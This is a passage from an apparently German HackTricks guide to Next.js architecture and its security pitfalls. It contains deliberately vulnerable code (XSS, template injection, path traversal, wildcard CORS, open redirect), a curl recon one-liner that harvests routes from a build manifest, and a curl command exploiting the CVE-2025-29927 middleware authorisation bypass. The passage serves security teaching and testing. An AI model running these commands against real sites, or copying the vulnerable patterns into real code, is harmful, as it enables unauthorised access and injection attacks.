# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Architektur einer Next.js-Anwendung

### Typische Datei- und Verzeichnisstruktur

Ein Standard-Next.js-Projekt folgt einer bestimmten Datei- und Verzeichnisstruktur, die Funktionen wie Routing, API-Endpunkte und Verwaltung statischer Assets unterstützt. Hier ein typischer Aufbau:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Wichtige Verzeichnisse und Dateien

- **public/:** Hostet statische Assets wie Bilder, Schriftarten und andere Dateien. Dateien hier sind unter dem Root-Pfad (`/`) zugänglich.
- **app/:** Zentrales Verzeichnis für die Seiten, Layouts, Komponenten und API-Routen deiner Anwendung. Nutzt das **App Router**-Paradigma und ermöglicht erweiterte Routing-Features sowie die Trennung von Server- und Client-Komponenten.
- **app/layout.tsx:** Definiert das Root-Layout deiner Anwendung, umschließt alle Seiten und stellt konsistente UI-Elemente wie Header, Footer und Navigationsleisten bereit.
- **app/page.tsx:** Dient als Einstiegspunkt für die Root-Route `/` und rendert die Startseite.
- **app/[route]/page.tsx:** Behandelt statische und dynamische Routen. Jeder Ordner innerhalb von `app/` repräsentiert ein Routen-Segment, und `page.tsx` in diesen Ordnern entspricht der Komponente der Route.
- **app/api/:** Enthält API-Routen, mit denen du serverlose Funktionen erstellen kannst, die HTTP-Anfragen verarbeiten. Diese Routen ersetzen das traditionelle `pages/api`-Verzeichnis.
- **app/components/:** Beinhaltet wiederverwendbare React-Komponenten, die auf verschiedenen Seiten und Layouts verwendet werden können.
- **app/styles/:** Beinhaltet globale CSS-Dateien und CSS-Module für komponentenspezifisches Styling.
- **app/utils/:** Enthält Utility-Funktionen, Hilfs-Module und andere nicht-UI-Logik, die in der gesamten Anwendung geteilt werden kann.
- **.env.local:** Speichert Umgebungsvariablen, die speziell für die lokale Entwicklungsumgebung gelten. Diese Variablen werden **nicht** in die Versionsverwaltung eingecheckt.
- **next.config.js:** Passt das Verhalten von Next.js an, inklusive webpack-Konfigurationen, Umgebungsvariablen und Sicherheitseinstellungen.
- **tsconfig.json:** Konfiguriert TypeScript-Einstellungen für das Projekt, aktiviert Type-Checking und andere TypeScript-Features.
- **package.json:** Verwaltet Projektabhängigkeiten, Scripts und Metadaten.
- **README.md:** Bietet Dokumentation und Informationen zum Projekt, einschließlich Installationsanweisungen, Nutzungshinweisen und weiteren relevanten Details.
- **yarn.lock / package-lock.json:** Fixiert die Projektabhängigkeiten auf bestimmte Versionen und sorgt so für konsistente Installationen in verschiedenen Umgebungen.

## Clientseitig in Next.js

### Dateibasiertes Routing im `app`-Verzeichnis

Das `app`-Verzeichnis ist der Eckpfeiler des Routings in den aktuellen Next.js-Versionen. Es nutzt das Dateisystem zur Definition von Routen, wodurch die Verwaltung von Routen intuitiv und skalierbar wird.

<details>

<summary>Umgang mit dem Root-Pfad /</summary>

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Wichtige Dateien:**

- **`app/page.tsx`**: Behandelt Anfragen an den Root-Pfad `/`.
- **`app/layout.tsx`**: Definiert das Layout der Anwendung und umschließt alle Seiten.

**Implementierung:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Erklärung:**

- **Routen-Definition:** Die Datei `page.tsx` direkt im Verzeichnis `app` entspricht der Route `/`.
- **Darstellung:** Diese Komponente stellt den Inhalt der Startseite dar.
- **Integration ins Layout:** Die `HomePage`-Komponente ist in `layout.tsx` eingebettet, das Header, Footer und andere gemeinsame Elemente enthalten kann.

</details>

<details>

<summary>Umgang mit anderen statischen Pfaden</summary>

**Beispiel: `/about` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Erläuterung:**

- **Routen-Definition:** Die Datei `page.tsx` im Ordner `about` entspricht der Route `/about`.
- **Darstellung:** Diese Komponente rendert den Inhalt der Seite `/about`.

</details>

<details>

<summary>Dynamische Routen</summary>

Dynamische Routen erlauben die Verarbeitung von Pfaden mit variablen Segmenten und ermöglichen es Anwendungen, Inhalte anhand von Parametern wie IDs, slugs usw. darzustellen.

**Beispiel: `/posts/[id]` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Erklärung:**

- **Dynamic Segment:** `[id]` bezeichnet ein dynamisches Segment in der Route und erfasst den `id`-Parameter aus der URL.
- **Accessing Parameters:** Das `params`-Objekt enthält die dynamischen Parameter und ist innerhalb der Komponente zugänglich.
- **Route Matching:** Jeder Pfad, der mit `/posts/*` übereinstimmt, wie z. B. `/posts/1`, `/posts/abc` usw., wird von dieser Komponente verarbeitet.

</details>

<details>

<summary>Verschachtelte Routen</summary>

Next.js unterstützt verschachtelte Routen und erlaubt hierarchische Routendesigns, die das Verzeichnislayout widerspiegeln.

**Beispiel: `/dashboard/settings/profile` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Die Datei `page.tsx` innerhalb von `dashboard/settings/profile/` entspricht der Route `/dashboard/settings/profile`.
- **Hierarchieabbildung:** Die Verzeichnisstruktur spiegelt den URL-Pfad wider und verbessert die Wartbarkeit und Klarheit.

</details>

<details>

<summary>Catch-All-Routen</summary>

Catch-All-Routen behandeln mehrere verschachtelte Segmente oder unbekannte Pfade und bieten Flexibilität bei der Routenverarbeitung.

**Beispiel: `/*` Route**

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Erklärung:**

- **Catch-All-Segment:** `[...slug]` erfasst alle verbleibenden Pfadsegmente als Array.
- **Verwendung:** Nützlich zur Behandlung dynamischer Routing-Szenarien wie von Benutzern erstellten Pfaden, verschachtelten Kategorien usw.
- **Routenabgleich:** Pfade wie `/anything/here`, `/foo/bar/baz` usw. werden von dieser Komponente verarbeitet.

</details>

### Potenzielle clientseitige Schwachstellen

Obwohl Next.js eine sichere Grundlage bietet, können unsachgemäße Programmierpraktiken Schwachstellen einführen. Wichtige clientseitige Schwachstellen sind:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-Angriffe treten auf, wenn bösartige Skripte in vertrauenswürdige Websites injiziert werden. Angreifer können Skripte im Browser der Nutzer ausführen, Daten stehlen oder Aktionen im Namen des Nutzers durchführen.

**Beispiel für anfälligen Code:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Warum es anfällig ist:** Die Verwendung von `dangerouslySetInnerHTML` mit nicht vertrauenswürdigen Eingaben ermöglicht Angreifern, bösartige Skripte einzuschleusen.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Tritt auf, wenn Benutzereingaben in Templates nicht ordnungsgemäß verarbeitet werden, wodurch Angreifer Templates oder Ausdrücke injizieren und ausführen können.

**Beispiel für verwundbaren Code:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Warum es verwundbar ist:** Wenn `template` oder `data` bösartigen Inhalt enthalten, kann dies zur Ausführung von unbeabsichtigtem Code führen.

</details>

<details>

<summary>Client Path Traversal</summary>

Es handelt sich um eine Schwachstelle, die es Angreifern erlaubt, clientseitige Pfade zu manipulieren, um unbeabsichtigte Aktionen auszuführen, wie z. B. Cross-Site Request Forgery (CSRF). Im Gegensatz zu server-side path traversal, das das Dateisystem des Servers angreift, konzentriert sich CSPT darauf, clientseitige Mechanismen auszunutzen, um legitime API-Anfragen zu bösartigen Endpunkten umzuleiten.

**Beispiel für verwundbaren Code:**

Eine Next.js-Anwendung erlaubt Benutzern, Dateien hoch- und herunterzuladen. Die Download-Funktion ist clientseitig implementiert, wobei Benutzer den Pfad der herunterzuladenden Datei angeben können.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Angriffsszenario

1. **Ziel des Angreifers**: Führe einen CSRF-Angriff aus, um eine kritische Datei (z. B. `admin/config.json`) zu löschen, indem `filePath` manipuliert wird.
2. **Ausnutzung von CSPT**:
- **Bösartige Eingabe**: Der Angreifer erstellt eine URL mit einem manipulierten `filePath` wie `../deleteFile/config.json`.
- **Resultierender API-Aufruf**: Der clientseitige Code macht eine Anfrage an `/api/files/../deleteFile/config.json`.
- **Server-Verhalten**: Wenn der Server den `filePath` nicht validiert, verarbeitet er die Anfrage und löscht oder exponiert möglicherweise sensible Dateien.
3. **Durchführung des CSRF**:
- **Gefälschter Link**: Der Angreifer sendet dem Opfer einen Link oder bettet ein bösartiges Script ein, das die Download-Anfrage mit dem manipulierten `filePath` auslöst.
- **Ergebnis**: Das Opfer führt die Aktion unbewusst aus, was zu unautorisiertem Zugriff auf Dateien oder deren Löschung führt.

#### Warum es anfällig ist

- **Fehlende Eingabevalidierung**: Die clientseitige Anwendung erlaubt beliebige `filePath`-Eingaben und ermöglicht so path traversal.
- **Vertrauen in Client-Eingaben**: Die serverseitige API vertraut und verarbeitet den `filePath` ohne Bereinigung.
- **Mögliche API-Aktionen**: Wenn der API-Endpunkt zustandsändernde Aktionen ausführt (z. B. Dateien löschen oder ändern), kann er via CSPT ausgenutzt werden.

</details>

### Recon: statische Export-Routen-Erkennung via _buildManifest

Wenn `nextExport`/`autoExport` true sind (statischer Export), gibt Next.js die `buildId` im HTML preis und liefert ein build manifest unter `/_next/static/<buildId>/_buildManifest.js`. Das `sortedPages`-Array und die route→chunk-Zuordnung dort listen jede vorgerenderte Seite auf, ohne brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Verwende die entdeckten Pfade (zum Beispiel `/docs`, `/docs/content/examples`, `/signin`) um auth testing und endpoint discovery voranzutreiben.

## Serverseitig in Next.js

### Serverseitiges Rendering (SSR)

Seiten werden bei jeder Anfrage auf dem Server gerendert, wodurch der Benutzer vollständiges HTML erhält. In diesem Fall sollten Sie Ihren eigenen Custom-Server erstellen, um die Anfragen zu verarbeiten.

**Anwendungsfälle:**

- Dynamische Inhalte, die sich häufig ändern.
- SEO-Optimierung, da Suchmaschinen die vollständig gerenderte Seite crawlen können.

**Implementierung:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statische Site-Generierung (SSG)

Seiten werden zur Build-Zeit vorgerendert, was zu schnelleren Ladezeiten und reduziertem Serveraufwand führt.

**Anwendungsfälle:**

- Inhalte, die sich nicht häufig ändern.
- Blogs, Dokumentation, Marketingseiten.

**Implementierung:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverlose Funktionen (API Routes)

Next.js erlaubt das Erstellen von API-Endpunkten als serverlose Funktionen. Diese Funktionen werden bei Bedarf ausgeführt, ohne dass ein dedizierter Server erforderlich ist.

**Anwendungsfälle:**

- Verarbeitung von Formularübermittlungen.
- Interaktion mit Datenbanken.
- Verarbeitung von Daten oder Integration mit Drittanbieter-APIs.

**Implementierung:**

Mit der Einführung des `app`-Verzeichnisses in Next.js 13 sind Routing und API-Verarbeitung flexibler und leistungsfähiger geworden. Dieser moderne Ansatz passt eng zum dateibasierten Routing-System, bringt jedoch erweiterte Möglichkeiten mit sich, einschließlich Unterstützung für Server- und Client-Komponenten.

#### Grundlegender Route-Handler

**Dateistruktur:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Erklärung:**

- **Ort:** API-Routen befinden sich im Verzeichnis `app/api/`.
- **Dateibenennung:** Jeder API-Endpunkt liegt in einem eigenen Ordner, der eine `route.js` oder `route.ts` Datei enthält.
- **Exportierte Funktionen:** Anstelle eines einzelnen Default-Exports werden spezifische HTTP-Methodenfunktionen (z. B. `GET`, `POST`) exportiert.
- **Response-Verarbeitung:** Verwende den `Response`-Konstruktor, um Antworten zurückzugeben; das ermöglicht mehr Kontrolle über Header und Statuscodes.

#### Umgang mit anderen Pfaden und Methoden:

<details>

<summary>Spezifische HTTP-Methoden behandeln</summary>

Next.js 13+ ermöglicht es, Handler für spezifische HTTP-Methoden in derselben `route.js`- oder `route.ts`-Datei zu definieren, was zu klarerem und besser organisiertem Code führt.

**Beispiel:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Mehrere Exporte:** Jede HTTP-Methode (`GET`, `PUT`, `DELETE`) hat ihre eigene exportierte Funktion.
- **Parameter:** Das zweite Argument bietet Zugriff auf Routenparameter über `params`.
- **Erweiterte Antworten:** Mehr Kontrolle über Antwortobjekte, wodurch eine präzise Verwaltung von Headern und Statuscodes möglich ist.

</details>

<details>

<summary>Catch-All- und verschachtelte Routen</summary>

Next.js 13+ unterstützt erweiterte Routing-Features wie Catch-All-Routen und verschachtelte API-Routen, die dynamischere und skalierbarere API-Strukturen ermöglichen.

**Catch-All-Routen-Beispiel:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erläuterung:**

- **Syntax:** `[...]` bezeichnet ein Catch-all-Segment, das alle verschachtelten Pfade erfasst.
- **Verwendung:** Nützlich für APIs, die unterschiedliche Routentiefen oder dynamische Segmente behandeln müssen.

**Beispiel für verschachtelte Routen:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Ermöglicht hierarchische API-Strukturen, die Ressourcenbeziehungen widerspiegeln.
- **Parameterzugriff:** Ermöglicht einfachen Zugriff auf mehrere Routenparameter über das `params`-Objekt.

</details>

<details>

<summary>Umgang mit API-Routen in Next.js 12 und früheren Versionen</summary>

## API-Routen im `pages`-Verzeichnis (Next.js 12 und frühere Versionen)

Bevor Next.js 13 das `app`-Verzeichnis und erweiterte Routing-Funktionen einführte, wurden API-Routen hauptsächlich im `pages`-Verzeichnis definiert. Dieser Ansatz wird weiterhin häufig verwendet und in Next.js 12 und früheren Versionen unterstützt.

#### Grundlegende API-Route

**Dateistruktur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Erläuterung:**

- **Location:** API-Routen befinden sich im Verzeichnis `pages/api/`.
- **Export:** Verwende `export default`, um die Handler-Funktion zu definieren.
- **Function Signature:** Der Handler erhält die Objekte `req` (HTTP-Anfrage) und `res` (HTTP-Antwort).
- **Routing:** Der Dateiname (`hello.js`) entspricht dem Endpoint `/api/hello`.

#### Dynamische API-Routen

**Dateistruktur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Erklärung:**

- **Dynamische Segmente:** Eckige Klammern (`[id].js`) kennzeichnen dynamische Route-Segmente.
- **Zugriff auf Parameter:** Verwende `req.query.id`, um auf den dynamischen Parameter zuzugreifen.
- **Umgang mit Methoden:** Nutze bedingte Logik, um verschiedene HTTP-Methoden (`GET`, `PUT`, `DELETE` usw.) zu behandeln.

#### Umgang mit verschiedenen HTTP-Methoden

Während das grundlegende API-Route-Beispiel alle HTTP-Methoden innerhalb einer einzigen Funktion behandelt, kannst du deinen Code so strukturieren, dass jede Methode explizit behandelt wird, um bessere Übersichtlichkeit und Wartbarkeit zu erreichen.

**Beispiel:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste Vorgehensweisen:**

- **Trennung der Verantwortlichkeiten:** Logik für verschiedene HTTP-Methoden klar trennen.
- **Konsistenz der Antworten:** Konsistente Antwortstrukturen sicherstellen, um die client-seitige Verarbeitung zu erleichtern.
- **Fehlerbehandlung:** Nicht unterstützte Methoden und unerwartete Fehler sauber behandeln.

</details>

### CORS-Konfiguration

Kontrollieren Sie, welche Origins auf Ihre API-Routen zugreifen können, um Cross-Origin Resource Sharing (CORS)-Schwachstellen zu mindern.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Beachte, dass **CORS auch in allen API-Routen** innerhalb der **`middleware.ts`**-Datei konfiguriert werden kann:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Erlaubt beliebigen Websites, auf die API zuzugreifen, und kann böswilligen Seiten ermöglichen, ohne Einschränkungen mit Ihrer API zu interagieren.
- **Breite Methodenfreigabe:** Das Zulassen aller Methoden kann Angreifern ermöglichen, unerwünschte Aktionen durchzuführen.

Wie Angreifer es ausnutzen:

Angreifer können bösartige Websites erstellen, die Anfragen an Ihre API stellen und dabei Funktionen wie Datenabruf, Datenmanipulation oder das Auslösen unerwünschter Aktionen im Namen authentifizierter Benutzer missbrauchen.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Server-Code-Offenlegung auf der Client-Seite

Es kann leicht passieren, **dass Code, der auf dem Server verwendet wird, auch im auf der Client-Seite offengelegten Code verwendet wird**. Der beste Weg, um sicherzustellen, dass eine Code-Datei niemals auf der Client-Seite offengelegt wird, ist die Verwendung dieses Imports am Anfang der Datei:
```js
import "server-only"
```
## Wichtige Dateien und ihre Rollen

### `middleware.ts` / `middleware.js`

**Ort:** Root des Projekts oder innerhalb von `src/`.

**Zweck:** Führt Code in der serverseitigen serverless-Funktion aus, bevor eine Anfrage verarbeitet wird, und ermöglicht Aufgaben wie Authentifizierung, Weiterleitungen oder das Modifizieren von Antworten.

**Ablauf der Ausführung:**

1. **Eingehende Anfrage:** Die Middleware fängt die Anfrage ab.
2. **Verarbeitung:** Führt Operationen basierend auf der Anfrage aus (z. B. Überprüfung der Authentifizierung).
3. **Antwortänderung:** Kann die Antwort ändern oder die Kontrolle an den nächsten Handler übergeben.

**Beispiele für Anwendungsfälle:**

- Weiterleitung nicht authentifizierter Benutzer.
- Hinzufügen benutzerdefinierter Header.
- Protokollieren von Anfragen.

**Beispielkonfiguration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Umgehung der Middleware-Autorisierung (CVE-2025-29927)

Wenn Autorisierung in der Middleware durchgesetzt wird, können betroffene Next.js-Versionen (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) durch Injizieren des Headers `x-middleware-subrequest` umgangen werden. Das Framework überspringt die Middleware-Rekursion und liefert die geschützte Seite zurück.

- Das Standardverhalten ist typischerweise eine 307-Weiterleitung zu einer Login-Route wie `/api/auth/signin`.
- Sende einen langen `x-middleware-subrequest`-Wert (wiederhole `middleware`, um `MAX_RECURSION_DEPTH` zu erreichen), um die Antwort auf 200 zu ändern:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Da authentifizierte Seiten viele Subressourcen laden, füge den Header zu jeder Anfrage hinzu (z. B. Burp Match/Replace mit einem leeren Match-String), damit Assets nicht umgeleitet werden.

### `next.config.js`

**Ort:** Stammverzeichnis des Projekts.

**Zweck:** Konfiguriert das Verhalten von Next.js, aktiviert oder deaktiviert Features, passt webpack-Konfigurationen an, setzt Environment-Variablen und konfiguriert verschiedene Sicherheitsfunktionen.

**Wichtige Sicherheitskonfigurationen:**

<details>

<summary>Sicherheits-Header</summary>

Sicherheits-Header erhöhen die Sicherheit Ihrer Anwendung, indem sie Browser anweisen, wie mit Inhalten umgegangen werden soll. Sie helfen, verschiedene Angriffe wie Cross-Site Scripting (XSS), Clickjacking und MIME type sniffing zu mindern:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Beispiele:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Einstellungen zur Bildoptimierung</summary>

Next.js optimiert Bilder für die Performance, aber Fehlkonfigurationen können zu Sicherheitslücken führen, z. B. indem nicht vertrauenswürdige Quellen das Injizieren von bösartigem Inhalt ermöglichen.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Erlaubt das Laden von Bildern aus beliebigen externen Quellen, einschließlich nicht vertrauenswürdiger oder bösartiger Domains. Angreifer können Bilder hosten, die bösartige Payloads enthalten oder Benutzer in die Irre führen.
- Ein weiteres Problem kann sein, eine Domain zuzulassen, **auf der jeder ein Bild hochladen kann** (wie `raw.githubusercontent.com`)

**How attackers abuse it:**

Durch das Einbinden von Bildern aus bösartigen Quellen können Angreifer Phishing-Angriffe durchführen, irreführende Informationen anzeigen oder Schwachstellen in Bild-Rendering-Bibliotheken ausnutzen.

</details>

<details>

<summary>Offenlegung von Umgebungsvariablen</summary>

Verwalte sensible Informationen wie API-Schlüssel und Datenbankzugangsdaten sicher, ohne sie dem Client preiszugeben.

#### a. Offenlegung sensibler Variablen

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Ohne das `NEXT_PUBLIC_`-Präfix exponiert Next.js Variablen nicht für den client. Wenn es jedoch versehentlich mit dem Präfix versehen ist (z. B. `NEXT_PUBLIC_SECRET_API_KEY`), wird es auf der client-side zugänglich.

**Wie Angreifer es ausnutzen:**

Wenn sensible Variablen dem client offengelegt werden, können Angreifer sie durch Inspektion des client-side Codes oder der network requests auslesen und so unautorisierten Zugriff auf APIs, databases oder andere services erlangen.

</details>

<details>

<summary>Redirects</summary>

Verwalte URL redirections und rewrites innerhalb deiner Anwendung, sodass Benutzer angemessen weitergeleitet werden, ohne open redirect vulnerabilities einzuführen.

#### a. Open Redirect Vulnerability

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dynamic Destination:** Ermöglicht es Benutzern, beliebige URLs anzugeben, wodurch open redirect attacks möglich werden.
- **Trusting User Input:** Weiterleitungen zu von Benutzern bereitgestellten URLs ohne Validierung können zu Phishing, Malware-Verbreitung oder Diebstahl von Zugangsdaten führen.

**How attackers abuse it:**

Angreifer können URLs konstruieren, die scheinbar von Ihrer Domain stammen, aber Benutzer auf bösartige Seiten weiterleiten. Zum Beispiel:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Benutzer, die der ursprünglichen Domain vertrauen, könnten unwissentlich auf schädliche Websites gelangen.

</details>

<details>

